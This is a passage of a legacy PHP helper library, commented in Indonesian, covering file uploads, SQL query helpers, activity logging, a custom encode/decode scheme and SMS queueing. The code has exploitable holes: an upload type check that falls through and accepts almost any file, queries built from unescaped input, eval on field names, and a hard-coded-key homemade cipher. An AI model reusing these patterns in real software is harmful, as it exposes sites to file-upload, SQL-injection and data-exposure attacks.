	//$folderTarget=$toroot.$folderTarget;
	if(!isset($_FILES[$nmvar]['name'])) {
		if ($isTest) echo "<br>file $nmvar kosong ";
		return "";//echo "g ada file $nmvar diupload";		
	} else {
		if ($isTest) echo "<br>file $nmvar diinput ";
		
	}
	
	if($_FILES[$nmvar]['error']) {		//File upload error encountered
		$pes=upload_errors($_FILES[$nmvar]['error']);
		if ($isTest) echo $pes;
		return "";
	}
	
	$FileName=$nmfile	= strtolower($_FILES[$nmvar]['name']); //uploaded file name
	$ImageExt			= substr($FileName, strrpos($FileName, '.')); //file extension
	$FileType=$tipe		= $_FILES[$nmvar]['type']; //file type
	$FileSize=$ukuran	= $_FILES[$nmvar]['size']; //file size
	$uploaded_date		= date("Y-m-d H:i:s");
	$tmpfile=$_FILES[$nmvar]["tmp_name"];
	$extasli = pathinfo($FileName, PATHINFO_EXTENSION);

	if ($nmfTarget=='') {
		//$target = $folderTarget.$nmfil;
		$target = str_replace("'","~",$nmfile);
	} else {
		$ext = pathinfo($nmfile, PATHINFO_EXTENSION);
		//$target = str_replace("'","~",$folderTarget.$nmfTarget.".$ext");	
		$target = str_replace("'","~",$nmfTarget);	
		$nmfile=str_replace("'","~",$nmfTarget);
	}

	$target = str_replace("#nmfile#",$nmfile,$target);	
	$target = str_replace("#nmf#",$nmvar,$target);	
	$target = str_replace("#nfasli#",$nmfile,$target);	
	$target = str_replace("#ext#",$extasli,$target);	
	$target = str_replace(".ext",".$extasli",$target);//mengubah extensi sesuai file yng diupoad
	$target = str_replace(" ","_",$target);
	
	$nft=$target;
	if ($isTest) echo "<br>sampai sini nft:$nft >>";
	$target=$folderTarget.$target;
	$target = str_replace("//","/",$target);
	$dir = pathinfo($target, PATHINFO_DIRNAME);
	$nfbody = pathinfo($target, PATHINFO_FILENAME);
	$ext = pathinfo($target, PATHINFO_EXTENSION);
	$nfasli=$_FILES[$nmvar]["name"];
	//$nmfile = pathinfo($target, PATHINFO_BASENAME);

	//$nfbody=substr($nft,0,strlen($nft)-4);//nama saja
	
	//createFolder($dir);
	buatFolder($folderTarget);
	if ($uploadVer==1) {
		
		$nmfile=basename($_FILES[$nmvar]['name']);
		//khusus file gambar
		if ($tipe=='gambar') $tipe="jpg,gif,png,bmp";
		if ($tipe=='doc') $tipe="doc,xls,txt";

		$tpx="";
		switch(strtolower($FileType)) {		//allowed file types
			case 'application/x-javascript': //.js
				$pes='Unsupported File ('.strtolower($FileType) .') !';
				return "";//output error
				break;
			case 'image/png': //png file
				$tpx="png";
			case 'image/gif': //gif file 
				$tpx="gif";
			case 'image/jpeg': //jpeg file
				$tpx="jpg";
			case 'application/pdf': //PDF file
				$tpx="pdf";
			case 'application/msword': //ms word file
				$tpx="doc";
			case 'application/vnd.ms-excel': //ms excel file
				$tpx="xls";
			case 'application/octet-stream': //ZIP
			case 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': //xlsx
			case 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'://docx
		
			case 'application/x-zip-compressed': //zip file
				$tpx="zip";
			case 'text/plain': //text file
				$tpx="txt";
			case 'text/html': //html file
				$tpx="html";
				break;
			default:
				$pes.='File type :'.strtolower($FileType) .'<br>';
		}
		//$pes.=strtolower($FileType)."";
		if ($maxfs>0) { 
			if ($ukuran> $maxfs) { 
				$pes.="<br>File Size is not allowed, maxs file size: $maxfs ";
				//return "";
			}
		}
		
		
		
		$ada=true;
		$idx=0;
		
		 //cekking file, jika ada apakah menindih atau mmbuat index	
		while ($ada ) {
			$targetlama=$target;
			$idx++;	
			if ($overwrite)
				$ada=false;//dianggap g ada, sehingga keluar dari while
			elseif (!file_exists($target)) {
				$ada=false;
			} else  {
				$ada=true;
				$nfo=str_replace("[0]","",$nfo);
				$target="$dir/$nfonly"."[$idx].$ext";				
			}			
			//echo "<br>$targetlama ".($ada?" sudah ada":"belum ada....");
		}
		
		//echo "curr folder:".getcwd()."<br>";
		$pes.= "<br>Temporary:$tmpfile<br>Target:$target<br>";
	
		$nmfile = pathinfo($target, PATHINFO_BASENAME);
		$nfo = pathinfo($target, PATHINFO_FILENAME);
		global $isTest;
		if ($isTest) {
			echo "<br>nmfile:$nmfile<br>nfo:$nfo";
		}
		//echo $pes;
		move_uploaded_file($tmpfile,  $target);
		//if (move_uploaded_file($tmpfile,  $target)) {
		if (file_exists($target)) {
		//	$pes.="<br>$nmfile uploaded succesfully to ".getcwd()."/$target<br>";
			$pes.="<br>$nmfile uploaded succesfully to $target<br>";
			//echo $pes;
			if ($isTest) echo $pes;			
			return ($nfonly==1?$nmfile:$target);
		} else {
			$pes.="<br>Cannot upload $nmfile ... <br>tmp:$tmpfile<br>target:$target"; 
			echo $pes;
			return "";
		} //berhasil atau tidak
		if ($showpes==1||$isTest)  echo $pes;
	} else { //upload ver2
		global $compressImage,$maxImageSize;
		global $prefictNfUpload,$vidusr,$folderHost ;
		
		//if (!isset($folderTarget)) $folderTarget=$toroot."uploaded/";
		if (!isset($compressImage)) $compress=false;
		if (!isset($maxImageSize)) $maxImageSize=200*1024;
		if (!isset($vidusr)) $vidusr=$userid;
		if (!isset($prefictNfUpload)) {
			$prefictNfUpload=$userType;
			if (isset($vidusr))	$prefictNfUpload.="-".$vidusr;
		}

		$h="";
		$handle = new Upload($_FILES[$nmvar]);
		if ($compressImage) {
			
			if ($handle->file_src_name_ext=='png') {
			     $handle->png_compression= 8;
		
			} else if ($handle->file_src_name_ext=='gif') {
				
			} else {
				$handle->image_convert         = 'jpg';
				if ($handle->file_src_size>$maxImageSize) {
					$handle->jpeg_size         = $maxImageSize;
				} else {
					$handle->jpeg_quality          = 80;
					
				}
			}
		}
		$msg="";
		$handle->file_new_name_body=$nfbody;
		
		$infoUpload="
				<br>================
				<br>dm:info upload  
				<br>================
				uploadFile(
				var:$nmvar
				foldertarget:$folderTarget,tipe: $tipe,maxfs $maxfs,nfonly $nfonly,
				nmfTarget: $nmfTarget -> $nft,showpes: $showPes,overwrite:$overwrite
				<br> 
				";
		if ($handle->uploaded) {
			
			// yes, the file is on the server
			// now, we start the upload 'process'. That is, to copy the uploaded file
			// from its temporary location to the wanted location
			// It could be something like $handle->process('/home/www/my_uploads/');
			//chmod($folderTarget,0755);
			$handle->process($folderTarget);
			//$handle->process(realpath(dirname(__FILE__) . '/upload/');
			//echo "uploaded";
			// we check if everything went OK
			
			if ($handle->processed) {
				$h=1;
				$nmfile=$handle->file_dst_name;
				//$target=$folderTarget.$nfo;
				$url=$folderHost.$folderTarget; 	
				//$url=$folderHost.$folderTarget.$nfo; 	
						//echo $url;//$target;
	//			$return= ($nfonly==0?$nmfile:$target);
	
				$return= ($nfonly==1?$nmfile:$folderTarget.$nmfile);
				if ($isTest) {
					echo "
					$infoUpload
					<br>File Berhasil diupload di $target (folder: $folderTarget file:$nft) 
					<br>Return: $return
					<br>nmdst $nmfile "; 
				}
				return $return;
			} else {
				$h=0;
				$url='';
				if ($isTest) {
					echo $infoUpload;
					echo "file berhasil diupload, tidak berhasil dipindahan/diproses ";
				}
				echo $msg=$handle->error;
				return "";
			}
			$handle-> clean();
		} else {
			$h=0;
			$url='';
			if ($isTest)  echo $infoUpload;
		
			$msg=$handle->error;
			return "";
		}
		
		exit;
	}
	return "";
}

//function outputs upload error messages, http://www.php.net/manual/en/features.file-upload.errors.php#90522
function upload_errors($err_code) {
	switch ($err_code) { 
        case UPLOAD_ERR_INI_SIZE: 
            return 'The uploaded file exceeds the upload_max_filesize directive in php.ini'; 
        case UPLOAD_ERR_FORM_SIZE: 
            return 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form'; 
        case UPLOAD_ERR_PARTIAL: 
            return 'The uploaded file was only partially uploaded'; 
        case UPLOAD_ERR_NO_FILE: 
            return 'No file was uploaded'; 
        case UPLOAD_ERR_NO_TMP_DIR: 
            return 'Missing a temporary folder'; 
        case UPLOAD_ERR_CANT_WRITE: 
            return 'Failed to write file to disk'; 
        case UPLOAD_ERR_EXTENSION: 
            return 'File upload stopped by extension'; 
        default: 
            return 'Unknown upload error'; 
    } 
} 

function deleteRecord($nmtable,$idr){
	global $id;
	$id=0;
	if (mysql_query2("delete from $nmtable where id='$idr'")) 
		return "data no $id pada tabel $nmtable berhasil dihapus";
		else
		return "data no $id pada tabel $nmtable tidak berhasil dihapus";
	}

function encode($string,$key) {
    $key = sha1($key);
    $strLen = strlen($string);
    $keyLen = strlen($key);
	$j=0;
	$hash="";
    for ($i = 0; $i < $strLen; $i++) {
        $ordStr = ord(substr($string,$i,1));
        if ($j == $keyLen) { $j = 0; }
        $ordKey = ord(substr($key,$j,1));
        $j++;
        $hash .= strrev(base_convert(dechex($ordStr + $ordKey),16,36));
    }
    return $hash;
}

function decode($string,$key) {
    $key = sha1($key);
    $strLen = strlen($string);
    $keyLen = strlen($key);
	$hash="";$j=0;
    for ($i = 0; $i < $strLen; $i+=2) {
        $ordStr = hexdec(base_convert(strrev(substr($string,$i,2)),36,16));
        if ($j == $keyLen) { $j = 0; }
        $ordKey = ord(substr($key,$j,1));
        $j++;
        $hash .= chr($ordStr - $ordKey);
    }
    return $hash;
}
/*
$encoded = encode("help me vanish" , "ticket_to_haven");
echo $encoded;
echo "\n";
$decoded = decode($encoded, "ticket_to_haven");
echo $decoded;
*/

function encod($text) {
	$key="um412@yahoo.com";
	if ($text=='') return 'um412@yahoo.com';
	//for ($i=1;$i<=3;$i++) { $text=base64_encode($text); }	
	for ($i=1;$i<=3;$i++) { $text=encode($text,$key); }	
	return $text;
}
function decod($text) {
	$key="um412@yahoo.com";
	if ($text=='') return 'um412@yahoo.com';
//	for ($i=1;$i<=3;$i++) { $text=base64_decode($text); }
	for ($i=1;$i<=3;$i++) { $text=decode($text,$key); }
	return $text;
}

function kirimSMS($no_tujuan,$isi_sms='test sms gateway',$pilih_format=-1) {
	$query = "INSERT INTO outbox(DestinationNumber, TextDecoded,Coding, CreatorID, Class)
			 VALUES ('$no_tujuan', '$isi_sms','Default_No_Compression', 
					 'Gammu', '$pilih_format')";
	$h=mysql_query2($query);
	if (!$h) {
		echo $query;
		exit;
	}
	return h;
}

//array nama field, jika separator diisi"array", makah hasil berupa array
function getArrayFieldName($sql,$separ="#"){	 
	$h=(mysql_query2($sql));
	$i = 0;
	$sfd="";
	$afd=array();
	$nf=mysql_num_fields($h) or die("err $sql ");
	while ($i < $nf) {$meta = mysql_fetch_field($h);$afd[]=$meta->name;$sfd.=($sfd==''?'':$separ).$meta->name;$i++;}
	return ($separ=='array'?$afd:$sfd);
}

function getArray($sql,$sfld="",$addArrName="a"){
	//sample: $app=getArray("select id,nama $sf","id,nama","a");--hasil: aid=array() dan anama=array();
	$jfld=0;
	if ($sfld!='') { //multiple field
		$afld=explode(",",$sfld);
		
		foreach ($afld as $xfld) {
			$postitik=strpos($xfld,"."); //cek posisi titik,misal tbx.id
			$fld=($postitik?substr($xfld,$postitik+1,100):$xfld);
			$afld[$jfld]=$fld; //menggantikan jika ada titik
			//echo "$fld ";
			eval("global $".$addArrName."$fld;$".$addArrName."$fld=array();");
			$jfld++;
		}
	}
	$ket="";
	$ga=array();
	$h=@mysql_query($sql);
	if ($h) {
		$i=0;
		while ($ra=mysql_fetch_array($h)) {
			$ja=count($ra);
			if ($ja==2) { //single field 
				$ga[$i]=$ra[0];
			}else {
				$j=0;
				for ($j=0;$j<$jfld;$j++) {
					$ga[$j][$i]=$ra[$j];
					if ($sfld!='') {
						$c="$".$addArrName.$afld[$j]."[$"."i]=$"."ra[$"."j];";
						eval($c);
					}
				}
			}

			//if ($showr==1) $ket.=($ket==""?"":",").$ra[0];
			$i++;
		}
	}
	else echo "error:".$sql;
	//if ($showr==1) echo ">>".$ket;
	return $ga;
}

//jika sepaarator ="array", maka menjadi array
function getString($sql,$separator=",",$skipblank=true){
	if ($separator=="array") {
		$ga=array();
	} else {
		$ga="";
	}
	$h=@mysql_query($sql);
	$jf=@mysql_num_fields($h) or die("Err: Func:getString $sql");
	if ($h) {
		$i=0;
		while ($ra=mysql_fetch_array($h)) {
			$skip=false;
			if (($ra[0]=='') && ($skipblank)) $skip=true;
			if (!$skip) {
				if ($separator!="array"){
					if ($i>0) $ga.=$separator;	
				}
				//$ga.=$ra[0];
				for ($s=0;$s<$jf;$s++){ 
					if ($separator=="array")
					$ga[]=$ra[$s];
					else {
						if ($s!=0) $ga.="#";
						$ga.=$ra[$s];
					}
				}
				
				$i++;
			}
		}
	}
	else echo "error $sql";
	return $ga;
}


function removeTag0($var,$sTags="",$tagOnly=0){
	$aTags=explode(",",$sTags);
	$hasil=$var;
	if ($tagOnly==1) { //hanya hapus tagsaja
		if ($sTags=="") {
				$hasil=str_replace("<","[",$hasil);
				$hasil=str_replace(">","]",$hasil);
				
			
		} else {
			
			foreach ($aTags as $tag) {
				$hasil=str_replace(strtolower("<$tag>"),"",$hasil);
				$hasil=str_replace(strtolower("</$tag>"),"",$hasil);
				$hasil=str_replace(strtoupper("<$tag>"),"",$hasil);
				$hasil=str_replace(strtoupper("</$tag>"),"",$hasil);
			}
		}
	} else {
		foreach($aTags as $tag) {
			$hasil=preg_replace("|<$tag\b[^>]*>(.*?)</$tag>|s", "", $hasil); //diakhiri dengan </tag>
			$hasil=preg_replace("/<$tag\b[^>]*>/i", "", $hasil);//diakhiri dengan /> atau >
		}
	}
	return trim($hasil);
}
 


function removeTag($text) {
//function removeTag($text, $tags = '', $invert = FALSE) {

$search = array('@<script[^>]*?>.*?</script>@si',  // Strip out javascript
               '@<[\/\!]*?[^<>]*?>@si',            // Strip out HTML tags
               '@<![\s\S]*?--[ \t\n\r]*>@' ,         // Strip multi-line comments including CDATA
              "/<.*?>/"       
);
/*
'@<style[^>]*?>.*?</style>@siU',    // Strip style tags properly
*/

$text = preg_replace($search, '', $text);
return $text; 

}

function removeTags2($stag,$var) {
	$t=$var;
	$atag=explode(",",$stag);
	foreach ($atag as $tag) {
		$t= preg_replace('/<'.$tag.'[^>]*>(.*)<\/'.$tag.'[^>]*>/i', '$1', $t);//menghilangkan p				
	}
	
	return $t;
	
}


function noTerakhir_old($nmTabel,$nmfield,$aw,$digit){
	$o="0000000000";

	//$aw=$_REQUEST['kode_matapelajaran']; 
	$sq="select $nmfield from $nmTabel where $nmfield like '$aw"."%' order by $nmfield desc";
	$c=cariField("$sq");

	if ($c=='') $noAkhir=1;
	
	
	$noAkhir=substr($c,strlen($aw),$digit)*1+1;  
	$noAkhir=$aw.substr($o.$noAkhir,strlen($noAkhir)-1,$digit);
	return $noAkhir;
}


function noTerakhir($tb="",$nmfield="",$awalan='NT',$digit=6){
	 
	$na=carifield("select max($nmfield) from $tb where $nmfield like '$awalan%' order by $nmfield desc limit 0,1 ");
	$na=str_replace($awalan,"",$na)*1+1;
	$noakhir="00000000".$na ;
	$noakhir=$awalan."".substr($noakhir,strlen($noakhir)-$digit,$digit);

	return $noakhir;
}

function addActivityToLog($nmtb ,$op,$id,$ket){	 
	global $idlog;
	$jenis="$nmtb $op";
	$sq="insert into tblog(jenislog,idtrans,ket) values('$jenis','$id','$ket')";
	mysql_query ($sq);
	$idlog=mysql_insert_id();
	if (cariField("select jenislog from tblogjenis where jenislog='$jenis'")=='') 
		mysql_query ("insert into tblogjenis(jenislog,deskripsi) values('$jenis','')");
	//echo $sq;
}

function addActivityToLog2($nmtb,$op,$id,$ket,$sq=""){
	global $userid;
	global $logVersion;
	global $idlog;
	global $tbLog;
	global $ip;
	if (!isset($logVersion)) $logVersion=2;
	if (!isset($tbLog)) $tbLog="tbh_logh2";
	if ($sq!='') {
		$sq=prepareSaveSQL($sq);
	}
	
	$jenis="$nmtb $op";
	$sq="insert into $tbLog(ip,tb,jenislog,idtrans,ket,user,sq) values('$ip','$nmtb','$jenis','$id','$ket','$userid','$sq')";
		
	mysql_query ($sq);
	$idlog=mysql_insert_id();
	//if (cariField("select jenislog from tblogjenis where jenislog='$jenis'")=='') 
	//	mysql_query ("insert into tblogjenis(jenislog,deskripsi) values('$jenis','')");
	//echo $sq;
}

//make sql can be saved into field
function prepareSaveSQL($sq){
	$sq=str_replace(";","#titkom#",$sq);
	$sq=str_replace("`","#`#",$sq);
	$sq=str_replace("'","`",$sq);
	return $sq;
}
function viewSavedSQL($fld){
	$fld=str_replace("#titkom#",";",$fld);
	$fld=str_replace("`","'",$fld);
	$fld=str_replace("#`#","`",$fld);
	return $fld;
}


function optimizeTable($tb="*") {
	$tt="";
	$atb=array();
	if ($tb!='*') {
		array_push($atb,$tb);
	} else {
		$atb=getArray("SHOW TABLES");
	}
	
	foreach($atb as $tb) {
		$h=mysql_query2(" OPTIMIZE TABLE $tb ");
		$tt.="Optimizing table $tb ....";
		$tt.($h?"Ok":"Error")."<br>";
	}
	return $tt;
}

function cekLockDB(){
	$stat=(getconfig("lockdb")*1==1?"Locked":"Open");
	return $stat;
}
function lockDB($opt=1) {
	mysql_query2("update tbconfig set lockdb='$opt'");
}

function mmmr($array, $output = 'mean'){
	$arr = array(12,33,23,4,20,124,4,2);

	// Mean = The average of all the numbers
	//echo 'Mean: '.mmmr($arr).'<br>';
	//echo 'Mean: '.mmmr($arr, 'mean').'<br>';
	
	// Median = The middle value after the numbers are sorted smallest to largest
	//echo 'Median: '.mmmr($arr, 'median').'<br>';
	
	// Mode = The number that is in the array the most times
	//echo 'Mode: '.mmmr($arr, 'mode').'<br>';
	
	// Range = The difference between the highest number and the lowest number
	//echo 'Range: '.mmmr($arr, 'range');
	

    if(!is_array($array)){
        return FALSE;
    }else{
        switch($output){
            case 'mean':
                $count = count($array);
                $sum = array_sum($array);
                $total = $sum / $count;
            break;
            case 'median':
                rsort($array);
                $middle = round(count($array) / 2);
                $total = $array[$middle-1];
            break;
            case 'mode':
                $v = array_count_values($array);
                arsort($v);
                foreach($v as $k => $v){$total = $k; break;}
            break;
            case 'maxmode':
                $v = count($array);
                //arsort($v);
                $i=$maxmode=$maxv2=$maxkey=0;
				foreach($array as $v2){
					//echo $v2. " -";
					if ($i==0) $maxkey=$v2;
					if ($maxkey<=$v2){
						$maxkey=$v2;
					}
					$i++;
				}
				$total=$maxkey; 
            	break;
			case 'minmode':
                $v = count($array);
                //arsort($v);
                $i=$minmode=$minv2=$minkey=0;
				foreach($array as $v2){
					if ($i==0) $minkey=$v2;
					if ($minkey>=$v2){
						$minkey=$v2;	
					}
					$i++;
				}
				$total=$minkey;
 	           break;
			case 'range':
                sort($array);
                $sml = $array[0];
                rsort($array);
                $lrg = $array[0];
                $total = $lrg - $sml;
            break;
			case 'sum':
                $total =  array_sum($array);
				break;
        }
        return $total;
    }
}

?>